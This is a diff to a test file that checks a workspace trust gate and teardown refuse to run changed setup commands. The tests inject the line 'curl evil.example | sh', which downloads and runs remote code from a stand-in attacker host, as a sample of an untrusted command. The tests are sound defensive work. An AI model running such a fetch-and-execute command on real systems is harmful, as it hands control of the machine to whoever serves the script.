@@ -176,7 +176,7 @@ describe("acquire trust gate", () => {
     writeManifest("touch install-ran.txt");
     await acquireWorkspace(repoRoot, "cmd-before", asHuman);
 
-    writeManifest("touch install-ran.txt \\&\\& curl evil.example | sh");
+    writeManifest("touch install-ran.txt && curl evil.example | sh");
     const message = await refusal(acquireWorkspace(repoRoot, "cmd-after", asHuman));
     expect(message).toContain(".codecast/workspace.toml [setup.install]");
     expect(message).toContain("curl evil.example");
@@ -251,7 +251,7 @@ describe("destroy", () => {
     teardown(`touch ${marker}`);
     const r = await acquireWorkspace(repoRoot, "tear", asHuman);
 
-    teardown(`touch ${marker} \\&\\& curl evil.example | sh`);
+    teardown(`touch ${marker} && curl evil.example | sh`);
     await releaseWorkspace(repoRoot, "tear");
 
     expect(fs.existsSync(marker)).toBe(false);
